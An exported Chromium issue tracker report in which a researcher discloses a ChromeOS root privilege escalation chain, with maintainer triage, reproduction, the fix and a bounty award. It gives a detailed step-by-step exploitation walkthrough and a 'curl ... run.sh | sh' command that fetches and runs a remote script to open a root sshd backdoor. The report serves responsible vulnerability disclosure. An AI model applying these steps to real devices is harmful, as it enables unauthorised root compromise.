# Security: Root priv escalation through shill, arc-setup, and upstart

| Field | Value |
|-------|-------|
| **Issue ID** | [40053456](https://issues.chromium.org/issues/40053456) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | OS>Systems |
| **Platforms** | ChromeOS |
| **Reporter** | ro...@rorym.cnamara.com |
| **Assignee** | ke...@chromium.org |
| **Created** | 2020-09-28 |
| **Bounty** | $30,000.00 |

## Description

**VULNERABILITY DETAILS**  

The shill-scripts user can be compromised to avoid chronos process termination on logout, allowing malicious code to exploit a post-logout chronos arbitrary directory chown. Arc-setup can be tricked into performing a root arbitrary file write to set the uid\_map of a user namespace to obtain uid 0, which can be utilized to restart an upstart service with controlled variables to escalate to full root in the init namespace.

**VERSION**  

Google Chrome 85.0.4183.131 (Official Build) (64-bit)  

Platform 13310.91.0 (Official Build) stable-channel eve  

Firmware Version Google\_Eve.9584.201.0

**REPRODUCTION CASE**  

It is necessary for termina to be installed prior to exploitation, manually starting Terminal once will be satisfactory. This step should be scriptable but has not been to simplify the PoC.

A staging server is used to retrieve the assets for this script. It is not necessary for exploitation but has been used to simplify the poc. HTTPSERVER in run.sh should be updated to reflect it's location. An HTTP server is required, I'm just using 'python2 -m SimpleHTTPServer' inside the directory containing exploit.obb.

When the server is running the exploit script can be executed with curl and sh:

curl <http://172.16.2.72:8000/run.sh> | sh

The script will trigger a logout shortly after start. When exploitation is complete, a click sound will be played through the speakers, indicating that exploitation was successful and that sshd is now running on port 1337 with keys in /tmp/ssh\_host\_rsa\_key.

From execution of curl to the completion notification is about 1 minute 10 seconds on my machine. This could be shortened by replacing sleeps with code to detect what they're waiting for (not done to simplify the poc).

DETAILS  

=== Arbitrary source bind mount ===  

By adding the 'bind' option to a dbus call to CrosDisks.Mount when mounting an sshfs URI it is possible to bind mount an arbitrary directory to under /media/fuse. The provided URI has its handler stripped which can result in a real path on the system, e.g sshfs:///run will result in a call to mount(2) with /run as it's first argument.

This bind mount persists until the sshfs binary executed after the mount fails, due to the invalid sshfs host value, and returns. However, the fuse umount is not forced by cros-disks [2]. A race condition occurs wherein a process can change directories into the newly bind mounted directory before it is unmounted, which causes the unmount to fail, and the mount point to no longer be tracked by cros-disks.

This can be done with bash by looping on the CrosDisks.Mount and concurrently attempting to 'cd' into the new mount directory until successful.

The mount target directory can be controlled with the mountlabel= cros-disks option, and this allows for the bind mount of /run to /media/fuse/crostini\_XXX\_termina\_penguin

[1] <https://chromium.googlesource.com/chromiumos/platform2/+/refs/heads/master/cros-disks/fuse_mounter.cc#262>  

[2] <https://chromium.googlesource.com/chromiumos/platform2/+/refs/heads/master/cros-disks/fuse_mounter.cc#467>

=== Obb exec mount ===  

ArcObbMounter mounts .obb files into /var/run/arc without the noexec flag. [1]

By sharing the PlayFiles location with the Termina VM, and writing a file into the /mnt/chromeos/PlayFiles/Music directory inside the VM, an attacker supplied .obb file can be made available to the arc-obb-mounter mount namespace under /data/media/0/Music/.

ArcObbMounterInterface.MountObb takes a signed integer to specify the gid offset for which to mount the obb file. By specifying an offset of -654360 it is possible to mount an obb file which is then readable by gid chronos (1000) outside of ARC. [2]

While the permissions of the mounted files do not include the executable bit, this is not necessary to load a shared object with LD\_PRELOAD. This can therefore be used to gain arbitrary code execution.

[1] <https://chromium.googlesource.com/chromiumos/platform2/+/refs/heads/master/arc/obb-mounter/mount_obb_fuse_main.cc#225>  

[2] <https://chromium.googlesource.com/chromiumos/platform2/+/refs/heads/master/arc/obb-mounter/mount.cc#60>

=== RunShillScriptStart arbitrary command execution ==  

The host validation performed by network\_diag does not take into account multiple lines of input. If a single valid line is specified, followed by a malicious line, the grep returns true and the input is considered a valid host. [1]

By calling the debugd.RunShillScriptStart dbus endpoint with a multiline argument, it is possible to gain arbitrary command execution as shill-scripts inside the debugd mount namespace. [2]

The debugd.RunShillScriptStart takes a file descriptor as a parameter, to write the output of the network\_diag tool. By passing in a memfd copy of the .so loaded from the obb file, the shill-scripts command execution can also use LD\_PRELOAD to obtain arbitrary code execution via /proc/self/fd/2.

[1] <https://chromium.googlesource.com/chromiumos/platform2/+/refs/heads/master/crosh/network_diag#1111>  

[2] <https://chromium.googlesource.com/chromiumos/platform2/+/refs/heads/master/crosh/network_diag#55>

=== chronos dbus impersonation ===  

dbus validates the caller user's identity using SCM\_CREDENTIALS during the initial handshake of the dbus protocol, but does not do so for any future RPC calls. The chronos user can connect to the dbus socket and authenticate legitimately, and then pass the now-authenticated unix socket over another unix socket (via SCM\_RIGHTS) connected to the arbitrary code execution under shill-scripts. This will allow the shill-scripts code execution to call dbus functions as chronos.

Upon logout, all chronos processes are terminated. Exploitation of shill-scripts and chronos dbus impersonation allows for code and access persistence even after the user session has ended (ie on the login screen)

=== chronos:chronos arbitrary chown ===  

During chrome start, at this stage for a login prompt, /home/chronos/Default is ensured to exist and chronos ownership is applied by login\_manager [1].

The EnsureDirectoryExists function uses base::DirectoryExists and will recreate as a directory if a non-directory is detected. However, base::DirectoryExists uses stat rather than lstat internally, and therefore EnsureDirectoryExists can be tricked into traversing a symbolic link and changing ownership of an arbitrary directory to chronos:chronos.

This is used to take ownership of /run

[1] <https://chromium.googlesource.com/chromiumos/platform2/+/refs/heads/master/login_manager/chrome_setup.cc#269>  

[2] <https://chromium.googlesource.com/chromiumos/platform2/+/refs/heads/master/libchromeos-ui/chromeos/ui/util.cc#57>

=== shill-scripts to chronos file access ==  

With shill-scripts' ability to impersonate chronos over dbus, a new Seneschal/9s server can be started. Utilizing the bind mount from the first step, user 'XXX's LinuxFiles storage directory is shared with the new Seneschal server [1]. This allows the shill-scripts user to access files as the chronos user via the 9p protocol, over the unix socket passed to Seneschal.StartServer.

Since /run is now owned by chronos, this allows shill-scripts to perform modifications to /run.

(note that p9 interactions are done via the included Golang code, due to the simplicity of the p9 library)

[1] <https://chromium.googlesource.com/chromiumos/platform2/+/refs/heads/master/vm_tools/seneschal/service.cc#813>

=== arc-setup arbitrary file write ===  

During arc-setup, the ApplyPerBoardConfigurationsInternal function attempts to copy the media\_profiles.xml to /run/arc/oem/etc/media\_profiles.xml. [1]

The source of media\_profiles.xml is obtained by reading chromeos-config, which is mounted under /run. Since /run/chromeos-config is a standard directory, under which the config directories (v1 and private) are mounted, shill-scripts can rename chromeos-config, moving the read-only mounted child directories out of the way, and recreate the directory structure containing arbitrary configuration.

The /run/chromeos-config/v1/arc/media-profiles/system-path file is created containing the path to a fifo in /tmp created earlier. This is the path that arc-setup will use as the source of the file copy [2].

The destination of the file copy is /run/arc/oem/etc/media\_profiles.xml. There is no validation that this file is not a symbolic link, so as above the /run/arc directory can be renamed, and the directory structure can be re-created to contain a symbolic link at the appropriate path. Since the 9p protocol as implemented by the 9s server does not include functionality to create a symbolic link, a previously created symbolic link placed in /run/chrome (a chronos-writable location) is moved to the correct location and name.

The target of the symbolic link is the uid\_map of a newly created user namespace, created by the shill-scripts code. Since arc-setup is running as root, by writing an appropriate uid mapping into the fifo the shill-scripts code execution is elevated to the root user in the init namespace.

At this time the code is uid 0 with no capabilities, inside a user namespace and the debugd mount namespace.

[1] <https://chromium.googlesource.com/chromiumos/platform2/+/refs/heads/master/arc/setup/arc_setup.cc#847>  

[2] <https://chromium.googlesource.com/chromiumos/platform2/+/refs/heads/master/arc/setup/arc_setup.cc#830>

=== arc-sensor container breakout ===  

Dbus SCM\_CREDENTIALS user authentication validates claims against the process uid with respect to the init namespace. This means that the uid 0 code execution can perform dbus requests as real root.

This can be used to start an upstart service with an imported variable. In this case the arc-sensor upstart service is targeted, which imports the CONTAINER\_PID variable against which it executes some commands using nsenter [1].

A separate user and mount namespace is created by the shill-scripts code which creates symlinks at the relevant executable locations to a memfd in the bind mounted proc file system. When the upstart job is triggered the nsenter will enter the attacker controlled namespace and execute the attacker controlled code with full root privileges.

This code will then use the bind mounted proc namespace to setns() back into the init mount and user namespaces, beep to indicate successful execution, and run sshd.

[1] <https://chromium.googlesource.com/chromiumos/platform2/+/refs/heads/master/arc/setup/etc/arc-sensor.conf#81>

EXPLOITATION WALKTHROUGH  

run.sh

1. Stage sshd config and keys for later
2. Repeatedly call CrosDisks.Mount with the bind option and sshfs:///run as the path. Simultaneously, attempt to cd into the directory as named by mountlabel. On success, return, as the mount will now persist.
3. Start the termina VM
4. Share the PlayFiles path with termina
5. Inside termina, curl the obb file from the configured staging server into /mnt/chromeos/PlayFiles/Music
6. Mount the downloaded obb file, now under /data/media/0/Music/exploit.obb, with a gid offset of -654360
7. The obb file will now be readable under /run/arc/obb/exploit, and the contained .so file can be LD\_PRELOAD'ed into /bin/true

dbus.c  

aschronos\_stage1  

8. This code can potentially be called 4 times (due to the network\_diag exploit), so implement a lockfile to ensure it only exploits once  

9. Create a memfd containing the contents of the .so file  

10. Shelling out to dbus-send, exploit the network\_diag script via debugd.RunShillScriptStart. Pass in the memfd from 9 as the 'output' file descriptor.  

11. Shill-scripts will LD\_PRELOAD dbus.so via the passed memfd with /proc/self/fd/2 to execute the same .so file.  

12. As shill-scripts, create a unix socket server in /dev/shm, which is shared between the debugd mount namespace and the init mount namespace. (shill-scripts execution continues below)  

13. As chronos (resuming from step 10), connect to the unix socket server. Open and pre-authenticate a dbus socket, create memfd descriptors containing the p9 go binary and the 'final' binary, also open an O\_DIRECTORY file descriptor to the init namespace /tmp directory. Pass all four file descriptors to shill-scripts, along with a pipe for signalling.  

14. Move /home/chronos/Default out of the way and create a symbolic link pointing to /run in the same location.  

15. Create a symbolic link in /run/chrome pointing to /tmp/piddir/uid\_map, used later  

16. Make a world writable fifo in /tmp  

17. Using the pipe from 13, signal to shill-scripts that it can continue execution.

dbus.c  

asshillscripts\_stage2 (executing as shill-scripts)  

18. Using the chronos authenticated dbus call SessionManagerInterface.StopSessionWithReason to end the user session.  

At this stage, all chronos processes will be forcefully terminated, and /run will be owned by chronos.  

19. Start vm\_concierge via debugd.StartVmConcierge  

20. Create a bound unix socket at a known location, and pass it to Seneschal.StartServer  

21. Share the /media/fuse/crostini\_XXX\_termina\_penguin directory as the LinuxFiles storage of the XXX user, via the Seneschal.SharePath dbus call. (this shares /run via the bind mount indirection)  

22. Execute the p9 Go memfd as shared by chronos.

p9.go  

"first"  

23. Using the unix socket created in 20, connect to the running Seneschal 9s server with the 9p protocol  

24. Rename /run/chromeos-config to a timestamped directory so it is out of the way  

25. Create /run/chromeos-config/v1/arc/media-profiles and write /tmp/fifo to system-path

dbus.c  

asshillscripts\_stage2 (post p9 "first")  

26. Fork and create a new mount namespace with the 'final' binary memfd symlinked under /system/bin for later  

27. Enter a new user namespace  

28. Using the init namespace /tmp O\_DIRECTORY file descriptor passed by chronos, and mkdirat/symlinkat, create a symlink pointing to the uid\_map of the user namespace created in 27. This is the indirection used by the symlink created in 15. (the symlink in 15 needed to be created before we knew the pid defined in 27)  

29. Stop Arc and start the ArcMiniContainer via dbus. This should read the chromeos-config planted path and hang during the copyfile waiting for the fifo (the source file is opened before the destination file)  

30. Execute the p9 Go memfd for the "second" stage

p9.go  

"second"  

31. As before, using 9s, rename /run/arc to a timestamped directory so it is out of the way  

32. Recreate the directory structure /run/arc/oem/etc  

33. Rename the symlink created in 15 to /run/arc/oem/etc/media\_profiles.xml. This will now point to the user namespace uid\_map of the main shill-scripts process (via /tmp indirection from 28)  

34. Write a shill-scripts -> root uid map to the fifo created in 16, as waited on by arc-setup triggered in 29. This will escalate the current process to uid root after a setuid(geteuid())  

35. Open and authenticate a root dbus session  

36. Call the Upstart Start function for arc-sensor, with the environmental variable CONTAINER\_PID set to the pid of the mount namespace process created in 26 (which is just sleeping). All /system/bin binaries used by the job are stubbed and the final nsenter to execute /system/bin/touch continues exploitation.

final.c  

Executing in a controlled mount and user namespace, nested inside the debugd mount namespace, as full root with capabilities  

37. Use setns with the init namespace pid 1 /proc to re-enter the init mnt and user namespaces  

38. Clean up the /home/chronos/Default symlink to prevent re-chowning, and re-own /run to root  

39. Kill off the sleeping dummy mount namespace process which we just left  

40. Play the wav to indicate exploitation  

41. Execute sshd on port 1337

## Attachments

- [newchain.tar.bz2](attachments/newchain.tar.bz2) (application/octet-stream, 3.7 MB)

## Timeline

### [Deleted User] (2020-09-28)

[Empty comment from Monorail migration]

### ke...@chromium.org (2020-09-28)

[Empty comment from Monorail migration]

[Monorail components: OS>Systems]

### ke...@chromium.org (2020-09-28)

[Empty comment from Monorail migration]

### ke...@chromium.org (2020-09-28)

Filed crbug.com/1133000, the lack of noexec in ArcMounter, as a non-blocking P-2. Maybe I'm underestimating the severity of that part, so I'll re-evaluate at the end of all this.

### ke...@chromium.org (2020-09-28)

[Empty comment from Monorail migration]

### ke...@chromium.org (2020-09-28)

[Empty comment from Monorail migration]

### ke...@chromium.org (2020-09-28)

Filed crbug.com/1133008 for the dbus impersonation bug.

### ke...@chromium.org (2020-09-28)

[Empty comment from Monorail migration]

### ke...@chromium.org (2020-09-28)

[Empty comment from Monorail migration]

### mn...@chromium.org (2020-09-29)

Maybe I'm blind, but I'm not seeing the run.sh script and other resources. Greg/Rory, can you attach them?

### ro...@rorym.cnamara.com (2020-09-29)

[Empty comment from Monorail migration]

### [Deleted User] (2020-09-29)

Setting milestone and target because of Security_Impact=Stable and high severity.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ke...@chromium.org (2020-09-29)

[Empty comment from Monorail migration]

### ke...@chromium.org (2020-09-30)

Rory the repro isn't working:

chronos@localhost / $ curl http://192.168.86.211:8000/run.sh | sh
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  2185  100  2185    0     0   711k      0 --:--:-- --:--:-- --:--:--  711k
Music is available at path /mnt/chromeosPlayFiles/Music
Error org.freedesktop.DBus.Error.Failed:
ERROR: ld.so: object '/run/arc/obb/exploit/dbus.so' from LD_PRELOAD cannot be preloaded (cannot open shared object file): ignored.
Error org.freedesktop.DBus.Error.Failed:
method return time=1601489313.574051 sender=:1.33 -> destination=:1.133 serial=40 reply_serial=2

I ran it on 85.0.4183.131 on an Eve

Is it possible I need to run on the same hardware as you?

### ro...@rorym.cnamara.com (2020-09-30)

It looks like that error occurs when termina fails to start. Is termina installed on your device?

As far as I know specific hardware shouldn't matter as long as arc and termina is supported.

### ke...@chromium.org (2020-09-30)

I forgot that step, thanks for the reminder.

### ke...@chromium.org (2020-09-30)

Also I see this persists after logout, but does it persist across reboot? 

### ro...@rorym.cnamara.com (2020-09-30)

It does not. The /home/chronos/Default symlink persists and re-chowns on reboot but there's no code persistence to take advantage of it.

### ke...@chromium.org (2020-09-30)

I am getting the same error. The /var/run/arc/obb/exploit directory exists but is empty. 

Permissions:
sudo ls -la /var/run/arc/obb/exploit
drwx--------- 2 root root 40 Sep 30 11:32 .

### ro...@rorym.cnamara.com (2020-09-30)

Does the same occur if re-running after a device reboot? 

### ke...@chromium.org (2020-09-30)

I am seeing the same bug, is it possible my hosting this on macOS is the problem?

### ke...@chromium.org (2020-09-30)

(macOS as the server, not the exploit target of course) 

### ro...@rorym.cnamara.com (2020-09-30)

It shouldn't matter. If you're not seeing a second log line requesting exploit.obb on your http server (assuming run.sh has been updated to reflect your IP address), this indicates that termina or penguin aren't launching properly.

After the shell script exits with a failure, can you vsh into pengiun? You should be able to copy/paste the vm_shell function in run.sh to validate.

### ro...@rorym.cnamara.com (2020-09-30)

Just for completeness, these are the exact steps I'm performing on a freshly powerwashed machine, validated just now:

Setup/Log in to my account
Search key "Terminal", Next, Install, wait for the terminal to open
Press the physical power button, Power Off
Press the physical power button again to boot
Log in to my account
Ctrl+alt+t to open crosh, "shell", "curl 172.16.2.72:8000/run.sh | sh"
Wait for clicks
Log in again
Ctrl+alt+t, "shell", "ssh -i /tmp/ssh_host_rsa_key -p 1337 root@127.0.0.1"

I see two requests to my http server for the relevant files:
172.16.3.76 - - [30/Sep/2020 21:24:22] "GET /run.sh HTTP/1.1" 200 -
172.16.3.76 - - [30/Sep/2020 21:24:44] "GET /exploit.obb HTTP/1.1" 200 -

### ke...@chromium.org (2020-09-30)

Got it, there is indeed a missing step here:

192.168.86.206 - - [30/Sep/2020 11:20:09] "GET /run.sh HTTP/1.1" 200 -

Let me powerwash and try again.

- Greg

### ke...@chromium.org (2020-09-30)

I forgot to update HTTPSERVER in run.sh! Let me try this again.

### ke...@chromium.org (2020-09-30)

It worked. As always, thanks for the high quality PoCs and answering our questions.

### [Deleted User] (2020-10-07)

[Empty comment from Monorail migration]

### [Deleted User] (2020-10-15)

kerrnel: Uh oh! This issue still open and hasn't been updated in the last 14 days. This is a serious vulnerability, and we want to ensure that there's progress. Could you please leave an update with the current status and any potential blockers?

If you're not the right owner for this issue, could you please remove yourself as soon as possible or help us find the right one?

If the issue is fixed or you can't reproduce it, please close the bug. If you've started working on a fix, please set the status to Started.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ke...@chromium.org (2020-10-15)

Update: the final CL is going through the CQ now. Once I merge, this will be marked Fixed.

### ke...@chromium.org (2020-10-23)

To the vrp panel, as I submitted this on behalf of Rory as a result of a bug in crbug.

### [Deleted User] (2020-10-23)

[Empty comment from Monorail migration]

### [Deleted User] (2020-10-23)

This is sufficiently serious that it should be merged to beta. But I can't see a Chromium repo commit here, so you will need to investigate what - if anything - needs to be merged to M87. Is there a fix in some other repo which should be merged? Or, perhaps this ticket is a duplicate of some other ticket which has the real fix: please track that down and ensure it is merged appropriately.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2020-10-23)

This bug requires manual review: M87's targeted beta branch promotion date has already passed, so this requires manual review
Before a merge request will be considered, the following information is required to be added to this bug:

1. Does your merge fit within the Merge Decision Guidelines?
- Chrome: https://chromium.googlesource.com/chromium/src.git/+/master/docs/process/merge_request.md#when-to-request-a-merge
- Chrome OS: https://goto.google.com/cros-release-branch-merge-guidelines
2. Links to the CLs you are requesting to merge.
3. Has the change landed and been verified on ToT?
4. Does this change need to be merged into other active release branches (M-1, M+1)?
5. Why are these changes required in this milestone after branch?
6. Is this a new feature?
7. If it is a new feature, is it behind a flag using finch?

Chrome OS Only:
8. Was the change reviewed and approved by the Eng Prod Representative? See Eng Prod ownership by component: http://go/cros-engprodcomponents

Please contact the milestone owner if you have questions.
Owners: benmason@(Android), bindusuvarna @(iOS), cindyb@(ChromeOS), lakpamarthy@(Desktop)

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ad...@chromium.org (2020-10-23)

[Empty comment from Monorail migration]

### ci...@chromium.org (2020-10-26)

Merge approved, M87

### ke...@chromium.org (2020-10-26)

[Empty comment from Monorail migration]

### [Deleted User] (2020-10-30)

[Empty comment from Monorail migration]

### ad...@google.com (2020-11-05)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.
******************************

### ad...@google.com (2020-11-05)

Congratulations, the VRP panel has decided to award $30,000 for this bug :)

### ro...@rorym.cnamara.com (2020-11-05)

Thank you!

### ad...@google.com (2020-11-05)

[Empty comment from Monorail migration]

### as...@google.com (2020-12-07)

Applying LTS labels. Marking as merged because all dependencies are in M86.

### ad...@google.com (2021-01-20)

[Empty comment from Monorail migration]

### [Deleted User] (2021-01-29)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ch...@google.com (2023-05-24)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### is...@google.com (2024-01-09)

This issue was migrated from crbug.com/chromium/1132954?no_tracker_redirect=1

[Monorail blocked-on: crbug.com/chromium/1132998, crbug.com/chromium/1133001, crbug.com/chromium/1133006, crbug.com/chromium/1133009, crbug.com/chromium/1133047]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40053456)*
